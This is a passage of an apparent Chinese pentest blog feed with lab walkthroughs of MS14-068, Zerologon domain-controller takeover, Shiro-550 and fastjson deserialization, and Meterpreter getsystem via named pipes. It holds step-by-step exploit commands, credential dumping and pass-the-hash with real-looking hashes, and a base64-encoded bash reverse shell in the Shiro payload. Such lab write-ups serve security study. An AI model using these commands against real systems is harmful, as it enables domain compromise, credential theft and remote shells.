class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shell</span> MS14-<span class="hljs-number">068</span>.exe -u august@august.com -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1007551803</span>-<span class="hljs-number">2786613087</span>-<span class="hljs-number">1256062893</span>-<span class="hljs-number">1001</span> -d <span class="hljs-number">10.10.10.120</span><br></code></pre></td></tr></table></figure><p>ip 可以通过ping dc 直接获取</p></li><li><p>写入证书</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mimikatz kerberos::ptc <span class="hljs-title class_">TGT_de1ay</span><span class="hljs-variable">@de1ay</span>.com.ccache<br></code></pre></td></tr></table></figure></li><li><p>验证</p><p>直接访问域控的c 盘文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\dc\c$</span><br></code></pre></td></tr></table></figure></li><li><p>可以使用当前的用户进行创建服务或者其他操作</p></li></ol><h1 id="CVE-2020-1472-–-Netlogon域提权"><a href="#CVE-2020-1472-–-Netlogon域提权" class="headerlink" title="CVE-2020-1472  – Netlogon域提权"></a>CVE-2020-1472  – Netlogon域提权</h1><h2 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>2020年08月12日， 微软官方发布了 NetLogon 特权提升漏洞的风险通告。攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成  功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h3><ol><li><p>获取域控主机的名称</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214113532321-17078817366274.png" alt="image-20240214113532321"></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> <br><span class="hljs-keyword">shell</span> nslookup DC<br></code></pre></td></tr></table></figure></li><li><p>检测是否存在漏洞</p><p>使用代理才能连接到dc</p><p>在cs 里面添加代理的方式</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">socks port</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214121417792.png" alt="image-20240214121417792"></p><p>可以查看已知的代理</p></li><li><p>上传漏洞检测程序</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214144941712.png" alt="image-20240214144941712"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">zerologon_tester</span>.exe DC <span class="hljs-number">10.10.10.10</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214121534872.png" alt="image-20240214121534872"></p></li><li><p>利用漏洞重置账号</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">1472</span>.py DC DC$ <span class="hljs-number">10.10.10.10</span><br></code></pre></td></tr></table></figure><p>将会把DC$ 用户的账号密码置空</p></li><li><p>获取域控用户的hash</p><blockquote><p>  <a href="https://github.com/fortra/impacket.git">https://github.com/fortra/impacket.git</a>  </p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> secretsdump.<span class="hljs-keyword">py</span> <span class="hljs-string">&#x27;de1ay.com/DC$@10.10.10.10&#x27;</span> -<span class="hljs-keyword">no</span>-pass<br></code></pre></td></tr></table></figure></li><li><p>使用hash 横向移动</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span>e9067ca378134e50512ab894de75517 mingy/administrator@<span class="hljs-number">10.10.10.10</span><br>   <br></code></pre></td></tr></table></figure></li><li><p>恢复域 - 获取Hash</p><p>做这一步的意义是，由于这个是直接将原来的DC$ 用户密码置空，现在准备回复</p><p>获取Sam数据库</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 保存</span><br>reg <span class="hljs-keyword">save</span> HKLM\<span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">SYSTEM</span><br>reg <span class="hljs-keyword">save</span> HKLM\SAM SAM<br>reg <span class="hljs-keyword">save</span> HKLM\SECURITY SECURITY<br>   <br></code></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 下载</span><br>lget <span class="hljs-keyword">SYSTEM</span><br>lget SAM<br>lget SECURITY<br>   <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 删除</span><br>del /f SYSTEM<br>del /f SAM<br>del /f SECURITY<br>   <br></code></pre></td></tr></table></figure><p>解密smb 数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">python3 secretsdump.py -sam SAM -<span class="hljs-keyword">system</span> <span class="hljs-keyword">SYSTEM</span> -<span class="hljs-keyword">security</span> <span class="hljs-keyword">SECURITY</span> <span class="hljs-keyword">LOCAL</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214134726247.png" alt="image-20240214134726247"></p></li><li><p>恢复域 - 还原Hash</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 reinstall_original_pw.py DC <span class="hljs-number">10.10.10.10</span> <span class="hljs-number">2</span>f7ff113dc8e29e9e2394cdbd05bf2ae<br>   <br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shell</span> reinstall_original_pw.exe DC <span class="hljs-number">10.10.10.10</span> <span class="hljs-number">2</span>f7ff113dc8e29e9e2394cdbd05bf2ae<br></code></pre></td></tr></table></figure><p>但是很有可能出现问题</p></li></ol><h3 id="mimikatz-利用"><a href="#mimikatz-利用" class="headerlink" title="mimikatz 利用"></a>mimikatz 利用</h3><ol><li><p>检测是否存在漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz lsadump::zerologon <span class="hljs-regexp">/target:10.10.10.10 /</span>account:DC$<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214135552938.png" alt="image-20240214135552938"></p></li><li><p>利用漏洞重置域账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz lsadump::zerologon /target:10.10.10.10 /account:DC$ /exploit<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214135723990.png" alt="image-20240214135723990"></p></li><li><p>获取域控用户Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz lsadump::dcsync /domain:mingy.local /dc:DC /user:administrator /authuser:DC$ /authdomain:mingy /authpassword:<span class="hljs-string">&quot;&quot;</span> /authntlm<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240214145341876.png" alt="image-20240214145341876"></p></li><li><p>得到域管权限</p><p>利用域管理员Hash得到域管权限，执行如下命令后会打开一个具有域管理员权限的cmd.exe进程  </p><p>获得SeDebugPrivilege权限  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> privilege::<span class="hljs-literal">debug</span>  <br></code></pre></td></tr></table></figure><blockquote><p>  注意：因为当前beacon用户权限为域内普通用户 MINGY\bob，需要有管理员或者SYSTEM权限才能  获得 SeDebugPrivilege 权限，因此需要在提权操作后得到的beacon中执行本步骤操作，这里我们  通过ms15-051得到SYSTEM权限的beacon  </p></blockquote><p>hash注入</p><blockquote><p>  mimikatz sekurlsa::pth  &#x2F;user:administrator &#x2F;domain:mingy &#x2F;rc4:7e9067ca378134e50512ab894de75517</p></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro漏洞整理</title>
    <link href="/2024/02/13/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <url>/2024/02/13/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h1><p>0x00 发现漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213234019859.png" alt="image-20240213234019859"></p><p>发现shiro </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213234318070.png" alt="image-20240213234318070"></p><p>登录页面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213234400375.png" alt="image-20240213234400375"></p><p>0x01</p><p>尝试利用</p><ol><li><p>使用ysoserial.jar</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">10998</span> CommonsCollections4 <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC85OTg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>然后生成cookie </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> shiro-<span class="hljs-built_in">exp</span>.<span class="hljs-keyword">py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">79.1</span>:<span class="hljs-number">10998</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213235416007.png" alt="image-20240213235416007"></p></li><li><p>监听</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213235440759.png" alt="image-20240213235440759"></p></li><li><p>设置cookie 发包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213235519168.png" alt="image-20240213235519168"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Shiro%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213235524893.png" alt="image-20240213235524893"></p><p>发现利用成功</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>整理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson漏洞整理</title>
    <link href="/2024/02/13/%E6%95%B4%E7%90%86/fastjson%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <url>/2024/02/13/%E6%95%B4%E7%90%86/fastjson%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson-1-2-45"><a href="#Fastjson-1-2-45" class="headerlink" title="Fastjson_1.2.45"></a>Fastjson_1.2.45</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/fastjson%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213174451834.png" alt="image-20240213174451834"></p><p>0x00</p><p>检测是否存在</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/fastjson%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213194156124.png" alt="image-20240213194156124"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/fastjson%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213194159582.png" alt="image-20240213194159582"></p><p>存在漏洞，尝试利用</p><p>0x01</p><p>使用工具</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/fastjson%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213220919001.png" alt="image-20240213220919001"></p><p>发现成功的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/fastjson%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240213224409385.png" alt="image-20240213224409385"></p>]]></content>
    
    
    
    <tags>
      
      <tag>整理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试框架提权</title>
    <link href="/2024/02/13/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/"/>
    <url>/2024/02/13/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h1><h2 id="metepreter-提权"><a href="#metepreter-提权" class="headerlink" title="metepreter 提权"></a>metepreter 提权</h2><p>在有一个Session的条件之下，直接使用getsystem自动提权</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213111652963.png" alt="image-20240213111652963"></p><p>发现成功提权</p><p>返回之前的权限</p><p>获取hash值是可以使用管理员权限，但是如果想要获取明文密码就需要获取system权限了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213112912104.png" alt="image-20240213112912104"></p><p>如果是高版本的windwos 就会发现提权不了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213113348162.png" alt="image-20240213113348162"></p><p>尝试了解getsystem的原理是什么</p><h2 id="getsystem命名管道原理"><a href="#getsystem命名管道原理" class="headerlink" title="getsystem命名管道原理"></a>getsystem命名管道原理</h2><h3 id="命名管道介绍"><a href="#命名管道介绍" class="headerlink" title="命名管道介绍"></a>命名管道介绍</h3><p>命名管道（Named Pipes）是一种简单的进程间通信（IPC）机制。命名管道可以在同一台计算机的不同进程之间，或者跨越一个网络的不同计算机的不同进程之间的可靠的双向或单向的数据通信。  </p><p>命名管道的命名规范遵循“通用命名规范(UNC)” ：  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">\\<span class="hljs-keyword">server</span>\pipe[\<span class="hljs-type">path</span>]\<span class="hljs-type">name</span><br></code></pre></td></tr></table></figure><ul><li>其中 \server 指定一个服务器的名字，如果是本机则用\.表示，\192.168.1.100表示网络  上的服务器。  </li><li>\pipe 是一个不可变化的“硬编码”字串（不区分大小写），用于指出该文件从属于NPFS  </li><li>[\path]\name 则唯一标识一个命名管道的名称。</li></ul><h3 id="模拟命名管道工作"><a href="#模拟命名管道工作" class="headerlink" title="模拟命名管道工作"></a>模拟命名管道工作</h3><blockquote><p>pipe_client.cpp</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NAME <span class="hljs-string">&quot;\\\\.\\Pipe\\mingy&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];<br>  DWORD WriteNum;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WaitNamedPipe</span>(PIPE_NAME, NMPWAIT_WAIT_FOREVER) == FALSE)<br>  &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;等待命名管道实例失败！&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  HANDLE hPipe = <span class="hljs-built_in">CreateFile</span>(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">if</span> (hPipe == INVALID_HANDLE_VALUE)<br>  &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;创建命名管道失败！&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">CloseHandle</span>(hPipe);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  cout &lt;&lt; <span class="hljs-string">&quot;与服务器连接成功！&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>  &#123;<br>    <span class="hljs-built_in">gets</span>(buffer);<span class="hljs-comment">//等待数据输入</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WriteFile</span>(hPipe, buffer, <span class="hljs-built_in">strlen</span>(buffer), &amp;WriteNum, <span class="hljs-literal">NULL</span>) == FALSE)<br>    &#123;<br>      cout &lt;&lt; <span class="hljs-string">&quot;数据写入管道失败！&quot;</span> &lt;&lt; endl;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br><br>  cout &lt;&lt; <span class="hljs-string">&quot;关闭管道！&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">CloseHandle</span>(hPipe);<br>  <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>pipe_server.cpp</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NAME <span class="hljs-string">&quot;\\\\.\\Pipe\\mingy&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];<br>  DWORD ReadNum;<br><br>  HANDLE hPipe = <span class="hljs-built_in">CreateNamedPipe</span>(PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">if</span> (hPipe == INVALID_HANDLE_VALUE)<br>  &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;创建命名管道失败！&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">CloseHandle</span>(hPipe);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ConnectNamedPipe</span>(hPipe, <span class="hljs-literal">NULL</span>) == FALSE)<br>  &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;与客户机连接失败！&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">CloseHandle</span>(hPipe);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  cout &lt;&lt; <span class="hljs-string">&quot;与客户机连接成功！&quot;</span> &lt;&lt; endl;<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>  &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ReadFile</span>(hPipe, buffer, <span class="hljs-number">1024</span>, &amp;ReadNum, <span class="hljs-literal">NULL</span>) == FALSE)<br>    &#123;<br>      cout &lt;&lt; <span class="hljs-string">&quot;读取数据失败！&quot;</span> &lt;&lt; endl;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    buffer[ReadNum] = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;读取数据:&quot;</span> &lt;&lt; buffer &lt;&lt; endl;<br>  &#125;<br><br>  cout &lt;&lt; <span class="hljs-string">&quot;关闭管道！&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">CloseHandle</span>(hPipe);<br>  <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213121758407.png"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213121717587.png" alt="image-20240213121717587"></p><p>模拟成功</p><p>查看所有的现存的命名管道</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 返回对象列表</span><br><span class="hljs-built_in">get-childitem</span> \\.\<span class="hljs-string">pipe</span>\<br><br><span class="hljs-comment"># 只显示名称</span><br>(<span class="hljs-built_in">get-childitem</span> \\.\<span class="hljs-string">pipe</span>\).<span class="hljs-string">FullName</span><br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/image-20240213121910042.png" alt="image-20240213121910042"></p><h3 id="模拟令牌"><a href="#模拟令牌" class="headerlink" title="模拟令牌"></a>模拟令牌</h3><p>模拟令牌是命名管道中常见的一种方法，一般可以用来提权操作，Metasploit 中的 getsystem 也就是这个原理</p><p>具体步骤</p><ol><li>创建一个以system权限启动的程序，这个程序的作用是连接指定的命名管道。  </li><li>创建一个进程，并让进程创建命名管道。  </li><li>让之前的以system权限启动的程序启动并连接这个命名管道。  </li><li>利用ImpersonateNamedPipeClient()函数生成system权限的token。  </li><li>利用system权限的token启动cmd.exe。</li></ol><h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><ol><li><p>使用administrator 开启一个命名管道</p><blockquote><p>  <a 